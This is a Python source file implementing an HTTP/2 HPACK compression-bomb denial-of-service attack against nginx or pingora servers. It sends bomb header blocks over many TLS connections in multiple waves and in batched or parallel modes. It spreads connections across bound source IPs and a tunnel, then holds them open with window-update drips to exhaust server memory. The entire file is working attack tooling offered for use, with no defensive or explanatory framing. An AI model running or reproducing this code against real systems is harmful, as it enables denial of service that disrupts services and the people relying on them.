"""Enhanced HTTP/2 HPACK bomb — multi-wave, batched bombs, hold modes."""
from __future__ import annotations

import ssl
import threading
import time

from attack_config import H2_MAX_STREAMS_PER_CONN, AttackConfig

_hpack_bomb = None
_variant_id = "nginx"


def configure_h2_variant(variant_id: str) -> None:
    """Set POC path before hpack_bomb import (nginx or pingora)."""
    global _hpack_bomb, _variant_id
    from variants import set_poc_path

    _variant_id = variant_id
    set_poc_path(variant_id)
    import hpack_bomb

    _hpack_bomb = hpack_bomb


def _hb():
    global _hpack_bomb
    if _hpack_bomb is None:
        configure_h2_variant(_variant_id)
    return _hpack_bomb


SOCKET_TIMEOUT = 300
MIN_BOMB_WIRE_BYTES = 50_000


class H2AttackEnhanced:
    """Extended califio H2Attack: bind IP, multi-wave bombs, hold modes."""

    def __init__(
        self,
        *args,
        bind_ip: str | None = None,
        socket_timeout: int = SOCKET_TIMEOUT,
        drip_bytes: int = 1,
        max_streams_per_conn: int = H2_MAX_STREAMS_PER_CONN,
        **kwargs,
    ):
        hb = _hb()
        self._base = hb.H2Attack(*args, **kwargs)
        self.host = self._base.host
        self.port = self._base.port
        self.num_streams = self._base.num_streams
        self.num_headers = self._base.num_headers
        self.conn_id = self._base.conn_id
        self.verbose = self._base.verbose
        self.sock = self._base.sock
        self.stream_ids = self._base.stream_ids
        self.active = self._base.active
        self.bind_ip = bind_ip
        self.socket_timeout = socket_timeout
        self.drip_bytes = max(1, drip_bytes)
        self.max_streams_per_conn = max_streams_per_conn
        self._stream_id_cursor = 0
        self.last_error: str | None = None

    def log(self, msg: str) -> None:
        self._base.log(msg)

    def close(self) -> None:
        self._base.close()

    def handshake(self) -> None:
        self._base.handshake()

    def _drain(self, timeout: float = 0.5) -> None:
        self._base._drain(timeout=timeout)

    def connect(self):
        hb = _hb()
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2"])

        from tunnel import create_connection as tunnel_connect

        raw = tunnel_connect(
            self.host,
            self.port,
            timeout=self.socket_timeout,
            bind_ip=self.bind_ip,
        )

        self.sock = ctx.wrap_socket(raw, server_hostname=self.host)
        self._base.sock = self.sock
        if self.sock.selected_alpn_protocol() != "h2":
            raise RuntimeError(f"ALPN {self.sock.selected_alpn_protocol()!r}")
        self.sock.settimeout(self.socket_timeout)
        self.log(f"TLS+h2 bind={self.bind_ip or 'default'}")

    def _remaining_stream_budget(self) -> int:
        return max(0, self.max_streams_per_conn - len(self.stream_ids))

    def send_bombs_on_streams(self, num_streams: int, first_id: int | None = None) -> tuple[float, list[int]]:
        hb = _hb()
        budget = self._remaining_stream_budget()
        if budget <= 0:
            self.last_error = "stream budget exhausted"
            return 0.0, []
        num_streams = min(num_streams, budget)

        if first_id is None:
            first_id = self._stream_id_cursor + 1 if self._stream_id_cursor else 1

        hpack_block = hb.build_hpack_bomb(self.num_headers)
        new_ids: list[int] = []
        total_wire = 0.0

        for i in range(num_streams):
            stream_id = first_id + 2 * i
            new_ids.append(stream_id)
            for f in hb.split_into_frames(stream_id, hpack_block):
                self.sock.sendall(f)
                total_wire += len(f)

        self._stream_id_cursor = max(self._stream_id_cursor, new_ids[-1] if new_ids else 0)
        self.stream_ids.extend(new_ids)
        self._base.stream_ids = self.stream_ids
        self.active = True
        self._base.active = True
        self._drain(timeout=0.5)
        return total_wire, new_ids

    def send_bombs_multi_wave(self, waves: int = 2, gap_sec: float = 0.3) -> float:
        total = 0.0
        next_id = 1
        for w in range(waves):
            if self._remaining_stream_budget() <= 0:
                break
            streams_this_wave = min(self.num_streams, self._remaining_stream_budget())
            wire, ids = self.send_bombs_on_streams(streams_this_wave, first_id=next_id)
            total += wire
            if not ids:
                break
            next_id = ids[-1] + 2
            self.log(f"wave {w + 1}/{waves}: {len(ids)} streams, {wire / 1024 / 1024:.2f} MB")
            if w + 1 < waves and gap_sec > 0:
                time.sleep(gap_sec)
        return total

    def send_bombs(self):
        wire, _ = self.send_bombs_on_streams(self.num_streams, first_id=1)
        self.log(f"Sent streams wire={wire / 1024 / 1024:.2f} MB")
        return wire

    def hold_with_drip(self, hold_seconds: int, drip_interval: int = 50):
        if hold_seconds <= 0 or drip_interval <= 0:
            return
        self._base.hold_with_drip(hold_seconds, drip_interval)

    def hold_hard(self, hold_seconds: int, drip_interval: int = 10):
        hb = _hb()
        self.log(f"Hard hold {hold_seconds}s drip={drip_interval}s")
        t0 = time.monotonic()
        drip_count = 0
        inc = self.drip_bytes

        while time.monotonic() - t0 < hold_seconds:
            wait_until = time.monotonic() + drip_interval
            while time.monotonic() < wait_until:
                remaining = wait_until - time.monotonic()
                if remaining <= 0:
                    break
                self._drain(timeout=min(remaining, 3.0))

            if not self.active:
                break
            try:
                self.sock.sendall(hb.window_update_frame(0, inc))
                for sid in self.stream_ids:
                    self.sock.sendall(hb.window_update_frame(sid, inc))
                drip_count += 1
            except (BrokenPipeError, ConnectionResetError, OSError) as exc:
                self.last_error = str(exc)
                self.active = False
                self._base.active = False
                break

        self.log(f"Hard hold ended: {drip_count} drips")

    def apply_hold_mode(self, hold: int, drip: int, mode: str) -> None:
        if mode in ("fire_and_forget", "none"):
            return
        if mode == "hard_hold":
            self.hold_hard(hold, drip)
        else:
            self.hold_with_drip(hold, drip)


def establish_enhanced(
    host: str,
    port: int,
    count: int,
    cfg: AttackConfig,
    bind_ips: list[str | None],
) -> list[H2AttackEnhanced]:
    conns: list[H2AttackEnhanced] = []
    lock = threading.Lock()

    def worker(i: int):
        bind = bind_ips[i % len(bind_ips)] if bind_ips else None
        c = H2AttackEnhanced(
            host,
            port,
            cfg.streams,
            cfg.headers,
            conn_id=i,
            verbose=False,
            bind_ip=bind,
            drip_bytes=cfg.drip_bytes,
            max_streams_per_conn=H2_MAX_STREAMS_PER_CONN,
        )
        try:
            c.connect()
            c.handshake()
            with lock:
                conns.append(c)
        except Exception as exc:
            c.last_error = str(exc)
            c.log(f"connect fail: {exc}")
            c.close()

    threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(count)]
    for i, t in enumerate(threads):
        t.start()
        if i + 1 < len(threads):
            time.sleep(cfg.conn_stagger_sec)
    for t in threads:
        t.join(timeout=SOCKET_TIMEOUT)
    return conns


def _bomb_one(c: H2AttackEnhanced, cfg: AttackConfig) -> tuple[bool, float, str | None]:
    try:
        if cfg.waves_per_conn > 1:
            w = c.send_bombs_multi_wave(cfg.waves_per_conn, cfg.wave_gap_sec)
        else:
            w = c.send_bombs()
        if w >= MIN_BOMB_WIRE_BYTES:
            return True, w, None
        return False, w, c.last_error or "wire too small"
    except Exception as exc:
        c.last_error = str(exc)
        c.active = False
        c._base.active = False
        return False, 0.0, str(exc)


def _bomb_parallel(chunk: list[H2AttackEnhanced], cfg: AttackConfig) -> list[tuple[bool, float, str | None]]:
    results: list[tuple[bool, float, str | None]] = [(False, 0.0, "missing")] * len(chunk)
    lock = threading.Lock()

    def worker(idx: int, conn: H2AttackEnhanced):
        r = _bomb_one(conn, cfg)
        with lock:
            results[idx] = r

    threads = [threading.Thread(target=worker, args=(i, c), daemon=True) for i, c in enumerate(chunk)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=SOCKET_TIMEOUT)
    return results


def bomb_connections(conns: list[H2AttackEnhanced], cfg: AttackConfig) -> tuple[int, float, list[str]]:
    ok = 0
    wire = 0.0
    errors: list[str] = []

    def absorb(results: list[tuple[bool, float, str | None]], batch: list[H2AttackEnhanced]):
        nonlocal ok, wire
        for (success, w, err), c in zip(results, batch):
            wire += w
            if success:
                ok += 1
            elif err:
                errors.append(f"conn{c.conn_id}:{err}")

    if cfg.bomb_mode == "batched" or cfg.bomb_batch_size > 0:
        batch_size = cfg.bomb_batch_size or 12
        for i in range(0, len(conns), batch_size):
            chunk = conns[i : i + batch_size]
            results = _bomb_parallel(chunk, cfg)
            absorb(results, chunk)
            if i + batch_size < len(conns) and cfg.bomb_batch_gap_sec > 0:
                time.sleep(cfg.bomb_batch_gap_sec)
    elif cfg.bomb_mode == "parallel":
        results = _bomb_parallel(conns, cfg)
        absorb(results, conns)
    else:
        for c in conns:
            success, w, err = _bomb_one(c, cfg)
            wire += w
            if success:
                ok += 1
            elif err:
                errors.append(f"conn{c.conn_id}:{err}")

    return ok, wire, errors


def hold_connections(conns: list[H2AttackEnhanced], cfg: AttackConfig) -> int:
    if cfg.hold <= 0 or cfg.hold_mode in ("fire_and_forget", "none"):
        return sum(1 for c in conns if c.active)

    threads = [
        threading.Thread(target=c.apply_hold_mode, args=(cfg.hold, cfg.drip, cfg.hold_mode), daemon=True)
        for c in conns
        if c.active
    ]
    for t in threads:
        t.start()
    timeout = cfg.hold + cfg.drip + 90
    for t in threads:
        t.join(timeout=timeout)
    return sum(1 for c in conns if c.active)
